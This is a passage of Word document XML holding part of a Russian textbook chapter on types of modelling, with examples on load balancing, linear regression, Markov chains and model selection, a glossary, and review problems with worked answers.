        <w:t xml:space="preserve"> Алгоритм Round Robin (по кругу).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Запрос 1 → Сервер 1</w:t>
        <w:br/>
        <w:t>Запрос 2 → Сервер 2</w:t>
        <w:br/>
        <w:t>Запрос 3 → Сервер 3</w:t>
        <w:br/>
        <w:t>Запрос 4 → Сервер 1</w:t>
        <w:br/>
        <w:t>Запрос 5 → Сервер 2</w:t>
        <w:br/>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Более сложная модель:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Weighted Round Robin (с весами, учитывающими производительность серверов).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если Сервер 1 мощнее других в 2 раза:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Веса: Сервер 1 = 2, Сервер 2 = 1, Сервер 3 = 1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Распределение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Запрос 1 → Сервер 1</w:t>
        <w:br/>
        <w:t>Запрос 2 → Сервер 1</w:t>
        <w:br/>
        <w:t>Запрос 3 → Сервер 2</w:t>
        <w:br/>
        <w:t>Запрос 4 → Сервер 3</w:t>
        <w:br/>
        <w:t>Запрос 5 → Сервер 1</w:t>
        <w:br/>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 9: Модель машинного обучения — линейная регрессия с градиентным спуском</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Обучить модель предсказывать цену квартиры по площади.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>цена = a × площадь + b</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цель:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти коэффициенты `a` и `b`, минимизирующие ошибку предсказания.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Функция потерь (MSE — Mean Squared Error):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>L = (1/n) × Σ (y_i - ŷ_i)²</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`y_i` — реальная цена квартиры `i`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`ŷ_i = a × x_i + b` — предсказанная цена</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм градиентного спуска:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Итеративно обновляем коэффициенты:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a := a - α × ∂L/∂a</w:t>
        <w:br/>
        <w:t>b := b - α × ∂L/∂b</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где `α` — learning rate (скорость обучения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Данные о квартирах:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Площадь (м²) | Цена (млн ₽) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ------------ | ------------ |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 50           | 5            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 70           | 7            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 100          | 10           |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>После обучения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a ≈ 0.1 (каждый м² добавляет 0.1 млн ₽)</w:t>
        <w:br/>
        <w:t>b ≈ 0 (нет базовой цены)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Модель:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>цена = 0.1 × площадь</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прогноз:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Квартира 80 м² стоит `0.1 × 80 = 8 млн ₽`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 10: Модель цепей Маркова</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Смоделировать поведение пользователя на сайте: какую страницу он посетит следующей?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Цепь Маркова — система с конечным числом состояний, где переход в следующее состояние зависит только от текущего состояния (не зависит от истории).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Три страницы: Главная (H), Каталог (C), Корзина (B).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Матрица переходов (вероятности):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>|       | H   | C   | B   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ----- | --- | --- | --- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 0.5 | 0.4 | 0.1 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 0.2 | 0.5 | 0.3 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 0.6 | 0.3 | 0.1 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Интерпретация:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если пользователь на Главной (H), то с вероятностью 50% останется на Главной, с 40% перейдёт в Каталог, с 10% в Корзину.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Пользователь сейчас в Каталоге (C). Какова вероятность, что через 2 шага он окажется в Корзине (B)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Решение: Матричное умножение (или симуляция).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>P(C → B за 2 шага) = P(C → H) × P(H → B) + P(C → C) × P(C → B) + P(C → B) × P(B → B)</w:t>
        <w:br/>
        <w:t>P = 0.2 × 0.1 + 0.5 × 0.3 + 0.3 × 0.1</w:t>
        <w:br/>
        <w:t>P = 0.02 + 0.15 + 0.03</w:t>
        <w:br/>
        <w:t>P = 0.2 (20%)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> С вероятностью 20% пользователь окажется в Корзине через 2 перехода.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3.4. Как выбрать тип модели?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">При решении задачи возникает вопрос: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>какую модель использовать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вот простой алгоритм выбора:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 1: Определить цель моделирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Понять систему** → графическая модель (блок-схема, UML, граф)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Спрогнозировать будущее** → математическая модель (регрессия, дифференциальные уравнения)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптимизировать** → математическая модель (линейное программирование, теория игр)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Оценить риски** → стохастическая модель (Монте-Карло, теория вероятностей)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 2: Оценить сложность системы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Простая система** → аналитическая модель (формула)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сложная система** → имитационная модель (симуляция)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 3: Есть ли случайность?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Детерминированная система** → детерминированная модель</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Случайная система** → стохастическая модель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Шаг 4: Важно ли время?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Статическая система** → статическая модель (таблица, граф)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Динамическая система** → динамическая модель (дифференциальные уравнения, симуляция)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель, описывающая состояние системы в фиксированный момент времени.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Динамическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель, описывающая изменение системы во времени.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналитическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель в виде формулы или уравнения, которое можно решить математически.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Имитационная модель (симуляция)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель, которая симулирует поведение системы шаг за шагом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Детерминированная модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель без случайности, результат предсказуем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стохастическая модель (вероятностная)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель, учитывающая случайность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгебраическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель в виде алгебраических уравнений (без производных).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дифференциальное уравнение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — уравнение, связывающее функцию с её производными (скоростью изменения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Линейная регрессия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — статистическая модель для прогнозирования зависимости `y = ax + b`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Корреляция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — мера связи между двумя переменными.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Теория вероятностей</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — раздел математики, изучающий случайные события.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Теория массового обслуживания</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — раздел теории вероятностей, изучающий очереди.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Метод Монте-Карло</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — метод имитационного моделирования на основе случайных чисел.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Граф</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — математическая модель для описания связей между объектами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Теория игр</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — раздел математики, изучающий стратегическое взаимодействие между игроками.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Равновесие Нэша</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — ситуация в игре, где ни одному игроку не выгодно менять стратегию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель SIR</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель распространения эпидемии (Susceptible, Infected, Recovered).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уравнения Лотки-Вольтерры</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель "хищник-жертва".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PageRank</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм ранжирования веб-страниц (Google).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цепь Маркова</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — система с конечным числом состояний, где переход зависит только от текущего состояния.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Теоретические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем отличаются статические и динамические модели? Приведите примеры.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: статические = фиксированный момент времени, динамические = изменение во времени._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое аналитическая модель? Чем она отличается от имитационной?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: аналитическая = формула, имитационная = симуляция._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**В чём разница между детерминированной и стохастической моделью?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: детерминированная = нет случайности, стохастическая = есть случайность._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое дифференциальное уравнение? Зачем оно нужно?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: уравнение со скоростью изменения, описывает динамические процессы._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое линейная регрессия? Для чего используется?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: модель `y = ax + b`, для прогнозирования зависимости._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое граф? Из чего он состоит? Приведите примеры применения.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: узлы и рёбра, социальные сети, навигация, зависимости задач._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое теория игр? Что такое равновесие Нэша?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: стратегическое взаимодействие, равновесие = никому не выгодно менять стратегию._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Практические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Модель остывания кофе: `T(t) = 20 + 70 × e^(-0.2t)`. Какая температура будет через 5 минут?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Ответ:_ `T(5) = 20 + 70 × e^(-1) ≈ 20 + 70 × 0.368 ≈ 45.8°C`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** В магазин приходит 30 клиентов/час, касса обслуживает 40 клиентов/час. Рассчитайте среднее время ожидания в очереди (модель M/M/1: `W = ρ / (μ × (1 - ρ))`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Ответ:_ `ρ = 30/40 = 0.75`, `W = 0.75 / (40 × 0.25) = 0.75 / 10 = 0.075 часа = 4.5 минуты`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Оптимальный размер заказа. `D = 5000`, `S = 100 ₽`, `H = 2 ₽`. Найдите `Q*` по формуле `Q* = √((2×D×S)/H)`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_ `Q* = √((2×5000×100)/2) = √(1000000/2) = √500000 ≈ 707 единиц`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Модель логистического роста: `P(t) = 500 / (1 + 9 × e^(-0.3t))`. Найдите численность популяции через 10 лет.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_ `P(10) = 500 / (1 + 9 × e^(-3)) ≈ 500 / (1 + 9 × 0.05) ≈ 500 / 1.45 ≈ 345`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Граф дорог. Москва ←(700 км)→ СПб, Москва ←(400 км)→ Казань, Казань ←(800 км)→ СПб. Найдите кратчайший путь от Москвы до СПб.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_ Прямой путь: 700 км. Через Казань: 400 + 800 = 1200 км. Кратчайший: 700 км (прямой).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Дисконтирование. Проект приносит 50 тыс. ₽ в год 1 и 80 тыс. ₽ в год 2. Ставка дисконтирования 12%. Найдите PV.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_ `PV = 50/(1.12) + 80/(1.12)² = 50/1.12 + 80/1.2544 ≈ 44.64 + 63.78 ≈ 108.42 тыс. ₽`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Метод Монте-Карло для оценки π. Из 5000 случайных точек в квадрате 3927 попали внутрь круга. Оцените π.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_ `π ≈ 4 × 3927 / 5000 = 3.1416`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Цепь Маркова. Матрица переходов: `P(A→A)=0.6, P(A→B)=0.4, P(B→A)=0.3, P(B→B)=0.7`. Пользователь в состоянии A. Какова вероятность, что через 1 шаг он будет в состоянии B?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_ `P(A→B) = 0.4 (40%)`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Заключение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Классификация видов моделирования — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не просто академическая муть</w:t>
      </w:r>
      <w:r>
        <w:t>, это инструмент для выбора правильного подхода к решению задачи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статическая или динамическая?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Зависит от того, важно ли время.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
